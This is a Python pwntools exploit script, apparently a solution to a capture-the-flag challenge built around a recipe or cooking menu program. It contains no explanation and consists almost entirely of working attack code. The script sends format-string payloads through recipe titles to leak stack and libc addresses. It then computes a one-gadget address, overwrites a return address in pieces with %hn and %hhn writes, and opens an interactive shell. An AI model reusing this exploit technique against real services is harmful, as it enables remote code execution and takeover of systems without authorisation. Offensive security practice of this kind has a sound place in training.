#!/usr/bin/env python
from pwn import *


host , port = '10.0.3.1' , 56746

#y = remote( host , port )
#y = process( './binary' )
#y = process( './binary' , env = { 'LD_PRELOAD' : './libc.so.6' } )

def Recipe():
    y.sendafter( 'ice:' , '1' )
def Assignment():
    y.sendafter( 'ice:' , '2' )
def info():
    y.sendafter( 'ice:' , '3' )
def Shop():
    y.sendafter( 'ice:' , '4' )
def Cook( food ):
    y.sendafter( 'ice:' , '5' )
    y.sendafter( 'to cook :' , food )
def Eat( idx ):
    y.sendafter( 'ice:' , '6' )
    y.sendafter( 'to eat ? :' , str( idx ) )
def ret():
    y.sendafter( 'ice:' , '4' )

def new_recipe( title ):
    y.sendafter( 'ice:' , '1' )
    y.sendafter( 'Title :' , title )

def remove_recipe():
    y.sendafter( 'ice:' , '2' )

def show_recipe():
    y.sendafter( 'ice:' , '3' )

def buy():
    y.sendafter( 'ice:' , '1' )

def sell():
    y.sendafter( 'ice:' , '2' )

def make():
    y.sendafter( 'ice:' , '3' )



a = 'Pineapple cake'
b = 'Beef noodles'


name = 'yuawn'

for i in range(25):
    #if raw_input() == "a\n":
        #break
    y = remote( host , port )
    #y = process( './binary' )
    #y = process( './binary' , env = { 'LD_PRELOAD' : './libc.so.6' } )

    y.sendafter( 'name:' , name )


    Cook( 'Beef noodles\n' )
    Eat( 0 )
    Cook( 'Beef noodles\n' )
    Eat( 0 )

    Recipe()
    new_recipe( '%1c%31$hhn\n' )
    y.sendlineafter( 'Choose ingredient :' , '2' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '2' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '2' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '2' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )




    #new_recipe( '%113c%35$hhn\n' )
    new_recipe( '%.113x%35$hhn\n' )
    y.sendlineafter( 'Choose ingredient :' , '3' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '2' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '2' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '2' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 'ingredient :' , '0' )

    #new_recipe( '%226c%37$hhn\n' )
    try:
        new_recipe( '%.226x%37$hhn\n' )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '0' )


    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 'ingredient :' , '0' )

    #new_recipe( '%p%.4096x\n' )
    try:
        new_recipe( '%p%4096c\n' )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '2' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '2' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )

    y.sendafter( 'ingredient :' , '\n' )

    #try:
    #    y.recvuntil( '0x' )
    #except:
    #    pass
        #.close()

    #o = y.recv(300)
    try:
        o = y.recvuntil('0x' , timeout = 0.5 )
        print o
    except:
        y.close()
        continue

    if '0x' not in o:
        y.close()
        continue


    a1 = int( y.recvline()[:12] , 16 )
    log.success( 'a1 -> %s' % hex( a1 ) )




    try:
        new_recipe( '%32$p\n' )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '4' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '2' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '2' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '2' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendafter( 'ingredient :' , '0' )


    y.recvuntil( '0x' )
    a2 = int( y.recvline()[:12] , 16 )
    log.success( 'a2 -> %s' % hex( a2 ) )


    try:
        new_recipe( '%40$p\n' )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '2' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendafter( 'ingredient :' , '0' )

    y.recvuntil( '0x' )
    a3 = int( y.recvline()[:12] , 16 )
    log.success( 'a3 -> %s' % hex( a3 ) )


    try:
        new_recipe( '%7$p\n' )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '4' )


    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '2' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '2' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '2' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendafter( 'ingredient :' , '0' )

    y.recvuntil( '0x' )
    a4 = int( y.recvline()[:12] , 16 )
    log.success( 'a4 -> %s' % hex( a4 ) )


    try:
        new_recipe( '%5c%31$hhn\n' )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '2' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '2' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '2' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendafter( 'ingredient :' , '0' )




    try:
        new_recipe( '%32735c%35$hn\n' )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )

    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '1' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '4' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '0' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendlineafter( 't :' , '3' )
    y.sendlineafter( 'No) :' , '1' )
    y.sendafter( 'ingredient :' , '0' )


    ofs = 0x203f1
    libc = a3 - ofs
    log.critical( 'libc -> %s' % hex( libc ) )

    magic = 0x4557a
    one = libc + magic
    log.critical( 'one -> %s' , hex( one ) )



#y.interactive()

    try:
        new_recipe( '%13$p.%31$p.' + '%p.' * 1 + '\n' )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )

    for _ in xrange( 13 ):
        y.sendlineafter( 'No) :' , '1' )
        y.sendlineafter( 't :' , '1' )

    y.recvuntil( '0x' )
    stk = int( y.recvuntil('0x')[:-3] , 16 )
    stk2 = int( y.recvuntil('.')[:-1] , 16 )
    log.success( 'stk -> %s' % hex( stk ) )
    log.success( 'stk2 -> %s' % hex( stk2 ) )

    print hex( ( stk & 0xff ) + 0x40 + 8 - 0x1f )



    try:
        new_recipe( '%{}c%13$hhn\n'.format( ( stk & 0xff ) + 0x40 + 8 + 8 + 4  - 0x1f ) )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )

    for _ in xrange( 13 ):
         y.sendlineafter( 'No) :' , '1' )
         y.sendlineafter( 't :' , '1' )


    #magic = 0xf24cb
    #one = libc + magic
    #log.critical( 'one -> %s' , hex( one ) )

    try:
        new_recipe( '%{}c%31$hn\n'.format( ( ( one >> 32 ) & 0xffff ) - 0x1f ) )
        #new_recipe( '%{}c%31$n\n'.format( ( one & 0xffffffff ) - 0x1f ) )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )

    for _ in xrange( 13 ):
         y.sendlineafter( 'No) :' , '1' )
         y.sendlineafter( 't :' , '1' )





    try:
        new_recipe( '%{}c%13$hhn\n'.format( ( stk & 0xff ) + 0x40 + 8 + 8 + 2  - 0x1f ) )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )

    for _ in xrange( 13 ):
         y.sendlineafter( 'No) :' , '1' )
         y.sendlineafter( 't :' , '1' )



    try:
        new_recipe( '%{}c%31$hn\n'.format( ( ( one >> 16 ) & 0xffff ) - 0x1f ) )
        #new_recipe( '%{}c%31$n\n'.format( ( one & 0xffffffff ) - 0x1f ) )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )

    for _ in xrange( 13 ):
         y.sendlineafter( 'No) :' , '1' )
         y.sendlineafter( 't :' , '1' )




    try:
        new_recipe( '%{}c%13$hhn\n'.format( ( stk & 0xff ) + 0x40 + 8 + 8   - 0x1f ) )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )

    for _ in xrange( 13 ):
         y.sendlineafter( 'No) :' , '1' )
         y.sendlineafter( 't :' , '1' )



    try:
        new_recipe( '%{}c%31$hn\n'.format( ( ( one ) & 0xffff ) - 0x1f ) )
        #new_recipe( '%{}c%31$n\n'.format( ( one & 0xffffffff ) - 0x1f ) )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )

    for _ in xrange( 13 ):
         y.sendlineafter( 'No) :' , '1' )
         y.sendlineafter( 't :' , '1' )

    try:
        new_recipe( '%{}c%13$hhn\n'.format( ( stk & 0xff ) + 0x40 + 8   - 0x1f ) )
    except:
        y.close()
        continue
    y.sendlineafter( 'Choose ingredient :' , '1' )

    for _ in xrange( 13 ):
         y.sendlineafter( 'No) :' , '1' )
         y.sendlineafter( 't :' , '1' )




    y.interactive()